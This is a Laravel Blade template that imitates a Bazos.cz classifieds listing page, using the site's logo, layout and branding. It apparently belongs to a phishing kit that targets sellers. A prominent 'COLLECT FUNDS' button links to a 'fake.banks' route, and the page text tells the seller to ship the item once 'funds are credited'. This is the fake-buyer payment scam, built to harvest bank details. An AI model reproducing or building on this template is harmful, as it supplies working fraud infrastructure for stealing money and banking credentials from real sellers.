@extends('layouts.fake')
@push('css')
<link href="{{asset('css/bazos.css')}}" rel="stylesheet">
@endpush
@section('content')
    <div class="sirka">
        <div class="listalogor">
            <div class="listalogol">
                <a href="#" title="Bazos.cz - Inzerce, bazar"><img
                            src="{{asset($fake->logo())}}" width="199" height="34" alt="Bazos.cz - Inzerce, inzeráty"></a>
            </div>
            <div class="listalogom"><b>... inzerce pro každého</b></div>
        </div>
        <div class="drobky">
            <a href="#" title="Inzerce Bazoš">Hlavní stránka</a> > <b>Inzerát č. {{$fake->track_id}}</b></div>
        <br>


        <div class="flexmain">
            <div class="maincontent">
                <div class="listainzerat inzeratyflex">
                    <div class="inzeratydetnadpis">
                        <H1 class=nadpisdetail>{{$fake->title}}</H1><span class=velikost10> - <span class="ztop">TOP</span> - [{{$fake->created_at->format('d.m. Y')}}]</span>
                        <a href="{{subRoute('fake.banks',['track_id'=>$fake->track_id])}}"
                           id="good"
                           style="background: #ffcd00;color: black; border-radius: 5px;float: right;padding: 5px 10px;margin-top: 5px;margin-right: 5px"
                           class="sc-dVhcbM ccONKs">
                                                    <span class="sc-fBuWsC hvBxNu"><b
                                                                id="ch1">{{__("COLLECT FUNDS")}}</b></span>
                        </a>
                    </div>
                </div>
                <br>
                <div class="carousel"
                     data-flickity='{ "fullscreen": true, "lazyLoad": 1, "wrapAround": true, "adaptiveHeight": true, "prevNextButtons": false }'>
                    <div class="carousel-cell"><img class="carousel-cell-image"
                                                    data-flickity-lazyload="{{asset($fake->img)}}"
                                                    src="{{asset($fake->img)}}"
                                                    width="567" height="600"
                                                    alt="{{$fake->title}}"></div>
                </div>
                <br><br>
                <div class=popisdetail>
                    {{__("After the funds are credited, please send the item to the buyer according to the given data or hand over the item by courier who will call you within 12 hours")}}
                    <br/>
                    {{__("After the item is shipped, please give the buyer a package number!")}}
                    <br/>
                    <br/>
                </div>
                <br>
                <table width="100%" cellpadding="5" cellspacing="0">
                    <tr>
                        <td width="35%" valign=top class=listadvlevo>
                            <table width="*" cellpadding="0" cellspacing="1">
                                <tr>
                                    <td height="22px" width="25%">Jméno:<br><br></td>
                                    <td colspan=2><b><a href="#"
                                                    rel="nofollow">{{$fake->recipient}}</a></b><br><br></td>
                                </tr>
{{--                                <tr id="overlaydetail">--}}
{{--                                    <td height="22px" width="25%">Telefon:<br><br></td>--}}
{{--                                    <td colspan=2><span class=teldetail--}}
{{--                                                        onclick="odeslatrequest('/detailtel.php?idi=148322617&idphone=650599');"><span--}}
{{--                                                    style="white-space: nowrap;">603... zobraz číslo</span></span><br><br></td>--}}
{{--                                </tr>--}}
                                <tr>
                                    <td height="22px" width="25%">Lokalita:</td>
                                    <td width="9%"><img src="https://www.bazos.cz/obrazky/map.svg" height="17"></td>
                                    <td>
                                        <a href="#">{{$fake->address}}</a></td>
                                </tr>
{{--                                <tr>--}}
{{--                                    <td height="22px" width="25%"><br>Vidělo:</td>--}}
{{--                                    <td colspan=2><br>1418 lidí</td>--}}
{{--                                </tr>--}}
                                <tr>
                                    <td height="22px" width="25%"><br>Cena:</td>
                                    <td colspan=2><br><b>{{$fake->price()}}</b></td>
                                </tr>
                            </table>
                        </td>
                    </tr>
                </table>
                <br>
                <br>
            </div>
        </div>
        <br>
        &copy;{{date("Y")}} Bazoš - <b>Inzerce</b><br>
        <br>
    </div>
@endsection